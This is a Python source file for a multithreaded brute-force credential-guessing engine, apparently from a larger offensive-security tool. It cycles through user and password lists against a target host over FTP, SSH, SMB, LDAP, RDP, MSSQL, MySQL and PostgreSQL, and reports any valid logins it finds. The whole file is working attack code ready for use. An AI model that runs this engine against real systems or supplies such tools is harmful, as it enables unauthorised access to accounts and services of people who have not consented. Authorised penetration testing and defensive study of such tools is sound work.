import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from src import process_registry

MAX_WORKERS = 10


class BruteForceEngine:
    def __init__(self, target, port, protocol, userlist=None, passlist=None,
                 users=None, passwords=None,
                 on_result=None, on_progress=None, on_found=None,
                 workers=None):
        self._target = target
        self._port = port
        self._protocol = protocol
        self._userlist = userlist
        self._passlist = passlist
        self._users = users
        self._passwords = passwords
        self._workers = workers or MAX_WORKERS
        self._on_result = on_result
        self._on_progress = on_progress
        self._on_found = on_found
        self._stop_flag = threading.Event()
        self._found = {}

    def start(self):
        self._stop_flag.clear()
        pid = process_registry.register(
            "Bruteforce",
            detail=f"{self._protocol}  {self._target}:{self._port}",
            icon="bruteforce.png")

        def _wrap():
            try:
                self._run()
            finally:
                process_registry.finish(pid)

        threading.Thread(target=_wrap, daemon=True).start()

    def stop(self):
        self._stop_flag.set()

    def _emit(self, text, color=None):
        if self._on_result:
            self._on_result(text, color)

    def _run(self):
        if self._users is not None:
            users = self._users
        elif self._userlist:
            users = self._load_lines(self._userlist)
        else:
            users = ["admin"]

        if self._passwords is not None:
            passwords = self._passwords
        elif self._passlist:
            passwords = self._load_lines(self._passlist)
        else:
            passwords = [""]

        total = len(users) * len(passwords)
        self._emit(f"\n[*] Loaded {len(users)} users, {len(passwords)} passwords ({total} combinations)\n")

        if self._protocol == "ftp":
            func = self._try_ftp
        elif self._protocol == "ssh":
            func = self._try_ssh
        elif self._protocol == "smb":
            func = self._try_smb
        elif self._protocol == "ldap":
            func = self._try_ldap
        elif self._protocol == "rdp":
            func = self._try_rdp
        elif self._protocol == "mssql":
            func = self._try_mssql
        elif self._protocol == "mysql":
            func = self._try_mysql
        elif self._protocol == "pgsql":
            func = self._try_pgsql
        else:
            self._emit(f"Unknown protocol: {self._protocol}", "error")
            return

        combinations = [(u, p) for u in users for p in passwords]
        tested = 0
        executor = ThreadPoolExecutor(max_workers=self._workers)
        futures = {}

        for user, pwd in combinations:
            if self._stop_flag.is_set():
                break
            futures[executor.submit(func, user, pwd)] = (user, pwd)

        for f in as_completed(futures):
            if self._stop_flag.is_set():
                break
            user, pwd = futures[f]
            tested += 1
            if self._on_progress:
                self._on_progress(tested, total)
            try:
                ok = f.result()
                if ok:
                    key = f"{user}:{pwd}"
                    if key not in self._found:
                        self._found[key] = True
                        if self._on_found:
                            self._on_found(self._protocol, self._target, self._port, user, pwd)
            except Exception:
                pass

        executor.shutdown(wait=False)
        self._emit(f"\n[*] Done. {len(self._found)} valid credentials found.")

    def _load_lines(self, path):
        lines = []
        try:
            with open(path, errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        lines.append(line)
        except Exception:
            pass
        return lines or ["admin"]

    def _try_ftp(self, user, pwd):
        from ftplib import FTP, error_perm
        try:
            ftp = FTP()
            ftp.connect(self._target, self._port, timeout=5)
            ftp.login(user, pwd)
            ftp.quit()
            self._emit(f"[+] FTP {self._target}:{self._port} — {user}:{pwd}", "success")
            return True
        except error_perm:
            return False
        except Exception:
            return False

    def _try_ssh(self, user, pwd):
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self._target, port=self._port, username=user,
                       password=pwd, timeout=5, allow_agent=False, look_for_keys=False)
            ssh.close()
            self._emit(f"[+] SSH {self._target}:{self._port} — {user}:{pwd}", "success")
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False

    def _try_smb(self, user, pwd):
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(self._target, self._target, timeout=5)
            conn.login(user, pwd)
            conn.close()
            self._emit(f"[+] SMB {self._target}:{self._port} — {user}:{pwd}", "success")
            return True
        except Exception:
            return False

    def _try_ldap(self, user, pwd):
        try:
            from ldap3 import Server, Connection, ALL, SUBTREE
            server = Server(self._target, port=self._port, get_info=ALL, connect_timeout=5)
            domain = ""
            if "\\" in user:
                domain, user = user.split("\\", 1)
            user_dn = user
            if domain:
                user_dn = f"{domain}\\{user}"
            conn = Connection(server, user=user_dn, password=pwd, authentication="SIMPLE",
                            auto_bind=True, read_only=True)
            conn.unbind()
            self._emit(f"[+] LDAP {self._target}:{self._port} — {user}:{pwd}", "success")
            return True
        except Exception:
            return False

    def _try_rdp(self, user, pwd):
        import subprocess as _sp
        try:
            r = _sp.run(["xfreerdp", f"/v:{self._target}:{self._port}",
                         f"/u:{user}", f"/p:{pwd}", "/cert-ignore",
                         "+auth-only", "/sec:nla", "/timeout:5000"],
                        capture_output=True, text=True, timeout=10)
            if "connected" in r.stderr.lower() or "connection" in r.stderr.lower():
                self._emit(f"[+] RDP {self._target}:{self._port} — {user}:{pwd}", "success")
                return True
        except Exception:
            pass
        return False

    def _try_mssql(self, user, pwd):
        try:
            import pymssql
            conn = pymssql.connect(self._target, user, pwd, port=str(self._port),
                                   login_timeout=5, as_dict=True)
            conn.close()
            self._emit(f"[+] MSSQL {self._target}:{self._port} — {user}:{pwd}", "success")
            return True
        except Exception:
            return False

    def _try_mysql(self, user, pwd):
        try:
            import pymysql
            conn = pymysql.connect(host=self._target, port=self._port, user=user,
                                   password=pwd, connect_timeout=5)
            conn.close()
            self._emit(f"[+] MySQL {self._target}:{self._port} — {user}:{pwd}", "success")
            return True
        except Exception:
            return False

    def _try_pgsql(self, user, pwd):
        try:
            import psycopg2
            conn = psycopg2.connect(host=self._target, port=self._port, user=user,
                                    password=pwd, connect_timeout=5)
            conn.close()
            self._emit(f"[+] PGSQL {self._target}:{self._port} — {user}:{pwd}", "success")
            return True
        except Exception:
            return False
